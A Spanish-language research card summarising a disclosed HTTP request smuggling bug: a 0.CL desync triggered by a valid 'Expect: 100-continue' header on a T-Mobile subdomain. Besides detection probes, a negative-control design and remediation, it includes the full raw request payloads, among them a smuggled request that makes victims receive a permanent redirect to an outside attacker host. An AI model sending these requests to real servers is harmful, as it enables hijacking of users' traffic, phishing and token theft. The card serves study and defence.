---
clase: protocolo
tech: expect-100-continue
cwe: CWE-444
cvss: 8.6 # [derivado] sin CVE en la fuente; estimado por redireccion de victima a host del atacante
payload: |
  # NOTA DE PROCEDENCIA (H1): estructura por lineas RECONSTRUIDA desde el render
  # colapsado. El host de la fuente es '<redactado>.t-mobile.com': el subdominio
  # esta redactado por politica de divulgacion pero el vendor (T-Mobile) esta
  # nombrado en prosa y el dominio base es literal.
  GET /logout HTTP/1.1
  Host: $SUBDOMINIO.t-mobile.com
  Expect: 100-continue
  Content-Length: 291

  # Respuesta: HTTP/1.1 404 Not Found
  #
  # Segunda fase: el cuerpo que el front-end olvido esperar se interpreta
  # como peticion nueva.
  GET /logout HTTP/1.1
  Host: $SUBDOMINIO.t-mobile.com
  Content-Length: 100

  GET / HTTP/1.1
  Host: $SUBDOMINIO.t-mobile.com

  GET https://psres.net/assets HTTP/1.1
  X: y

  # Respuesta: HTTP/1.1 200 OK
  # Peticion de la victima:
  #   GET / HTTP/1.1
  #   Host: $SUBDOMINIO.t-mobile.com
  # Lo que recibe la victima:
  #   HTTP/1.1 301 Moved Permanently
  #   Location: https://psres.net/...
precondicion: "Basta una cabecera Expect VALIDA (sin ofuscar). La fuente afirma: 'Simply sending a valid Expect header causes a 0.CL desync on numerous different servers'. El mecanismo es un front-end que, tras recibir del back-end una respuesta distinta de 100, olvida que todavia debe recibir cuerpo del cliente. Requiere reutilizacion de conexion upstream para alcanzar a una victima."
como_se_descubre: |
  Señal en recon: cualquier endpoint que acepte `Expect: 100-continue`. Sonda de bajo
  coste: enviar `Expect: 100-continue` con un `Content-Length` declarado y NO enviar el
  cuerpo. Si el front-end responde de inmediato con un status distinto de 100 en lugar
  de bloquearse esperando el cuerpo, ha perdido la cuenta del cuerpo pendiente: es la
  firma del 0.CL. Endpoints de sesion (`/logout`, `/login`) son objetivos de alto valor
  porque su respuesta es cacheable o redirigible.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: GET /logout con 'Expect: 100-continue' y Content-Length declarado, sin cuerpo
  #    -> respuesta inmediata != 100 (p.ej. 404) = el front-end olvido el cuerpo
  # B: GET /logout identico SIN cabecera Expect, con Content-Length declarado y sin cuerpo
  #    -> el servidor espera (timeout) o responde 400 = comportamiento correcto
  # Si A y B se comportan igual, no hay 0.CL por Expect.
mata: |
  - El front-end responde 100 Continue y espera correctamente el cuerpo -> muere.
  - El front-end elimina o normaliza Expect antes de reenviar.
  - Sin reutilizacion de conexion upstream entre usuarios: solo self-desync, sin victima.
  - A y B indistinguibles (ver control negativo).
fuente: "https://portswigger.net/research/http1-must-die (James Kettle, 2025-08-06), seccion '0.CL desync via vanilla Expect - T-Mobile'. Recompensa citada en el articulo: $12,000."
confianza: media
fecha: 2026-11-02
---
# [PROTOCOLO] 0.CL desync con Expect válido (sin ofuscar) en T-Mobile — redirección de usuarios a dominio del atacante

## Principio
Una cabecera `Expect: 100-continue` perfectamente válida basta. Cuando el back-end
contesta algo que no es `100 Continue`, un front-end defectuoso da la transacción por
terminada y olvida que aún le debe llegar el cuerpo del cliente — así que los bytes del
cuerpo caen en la conexión como si fueran una petición nueva.

## Payload
Primera fase, que establece el desync:

```http
GET /logout HTTP/1.1
Host: $SUBDOMINIO.t-mobile.com
Expect: 100-continue
Content-Length: 291
```

→ `HTTP/1.1 404 Not Found`

El cuerpo que el front-end dejó de esperar contiene:

```http
GET /logout HTTP/1.1
Host: $SUBDOMINIO.t-mobile.com
Content-Length: 100

GET / HTTP/1.1
Host: $SUBDOMINIO.t-mobile.com

GET https://psres.net/assets HTTP/1.1
X: y
```

→ `HTTP/1.1 200 OK`

Una víctima que luego pide la raíz recibe:

```http
HTTP/1.1 301 Moved Permanently
Location: https://psres.net/...
```

## Impacto
Redirección permanente de usuarios reales del operador a un host del atacante. Que la
respuesta sea un `301` y no un `302` agrava el efecto: los navegadores cachean las
redirecciones permanentes, así que la víctima puede quedar fijada al dominio del
atacante más allá de la conexión envenenada. Desde ahí se encadena phishing con el
dominio legítimo en el historial, robo de tokens en la URL y ejecución de JS en el
origen de la víctima si el flujo vuelve. Recompensa pagada: $12.000.

## Remediación
El front-end debe mantener la contabilidad del cuerpo pendiente con independencia del
status que devuelva el back-end: si declaró `Content-Length`, debe consumir o abortar
la conexión, nunca reutilizarla con bytes sin leer. `# [derivado]`: lo más seguro es
que el borde no reenvíe `Expect` en absoluto y gestione él mismo el `100-continue`.
La recomendación estructural de la fuente sigue siendo migrar el salto upstream a
HTTP/2, donde la longitud va en frames y no admite esta ambigüedad.
